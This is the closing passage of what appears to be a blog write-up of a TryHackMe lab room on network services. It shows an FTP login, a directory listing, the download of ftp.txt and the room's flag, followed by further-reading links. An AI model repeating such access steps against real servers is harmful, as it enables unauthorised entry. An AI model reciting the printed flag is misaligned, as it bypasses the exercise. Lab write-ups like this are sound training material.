+</span></span><span class=line><span class=cl>Password:
+</span></span><span class=line><span class=cl>230 Login successful.
+</span></span><span class=line><span class=cl>Remote system type is UNIX.
+</span></span><span class=line><span class=cl>Using binary mode to transfer files.
+</span></span><span class=line><span class=cl>ftp&gt;
+</span></span></code></pre></td></tr></table></div></div><p><code>No answer needed</code></p><ol start=3><li>What is ftp.txt?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ftp&gt; ls
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Here comes the directory listing.
+</span></span><span class=line><span class=cl>drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
+</span></span><span class=line><span class=cl>-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
+</span></span><span class=line><span class=cl>226 Directory send OK.
+</span></span><span class=line><span class=cl>ftp&gt; get ftp.txt
+</span></span><span class=line><span class=cl>local: ftp.txt remote: ftp.txt
+</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
+</span></span><span class=line><span class=cl>150 Opening BINARY mode data connection for ftp.txt (26 bytes).
+</span></span><span class=line><span class=cl>226 Transfer complete.
+</span></span><span class=line><span class=cl>26 bytes received in 0.00 secs (52.5686 kB/s)
+</span></span><span class=line><span class=cl>ftp&gt; exit
+</span></span><span class=line><span class=cl>221 Goodbye.
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Network Services$ cat ftp.txt
+</span></span><span class=line><span class=cl>THM{y0u_g0t_th3_ftp_fl4g}
+</span></span></code></pre></td></tr></table></div></div><p><code>THM{y0u_g0t_th3_ftp_fl4g}</code></p><h2 id=task-11-expanding-your-knowledge>Task 11 Expanding Your Knowledge<a hidden class=anchor aria-hidden=true href=#task-11-expanding-your-knowledge>#</a></h2><p><strong>Further Learning</strong></p><p>There is no checklist of things to learn until you&rsquo;ve officially learnt everything you can. There will always be things that surprise us all, especially in the sometimes abstract logical problems of capture the flag challenges. But, as with anything, practice makes perfect. We can all look back on the things we&rsquo;ve learnt after completing something challenging and I hope you feel the same about this room.</p><p><strong>Reading</strong></p><p>Here&rsquo;s some things that might be useful to read after completing this room, if it interests you:</p><p><a href=https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef>https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef</a>
+<a href=https://attack.mitre.org/techniques/T1210/>https://attack.mitre.org/techniques/T1210/</a>
+<a href=https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/>https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/</a></p><p><strong>Thank you</strong></p><p>Thanks for taking the time to work through this room, I wish you the best of luck in future.</p><p>~ Polo</p><ol><li>Well done, you did it!</li></ol><p><code>No answer needed</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/windows/>Windows</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
